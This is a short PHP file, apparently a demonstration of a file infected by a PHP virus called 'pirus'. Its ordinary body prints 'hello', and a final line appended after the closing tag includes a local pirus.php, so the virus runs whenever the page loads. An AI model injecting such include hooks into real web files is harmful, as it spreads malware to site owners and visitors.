<?php
//A sample infected file .. look at the end line .. that's where we are :)
print "hello";
?>

<?php include("C:\PROGRAM FILES\HTTPD\HTDOCS\WORK\pirus.php"); ?>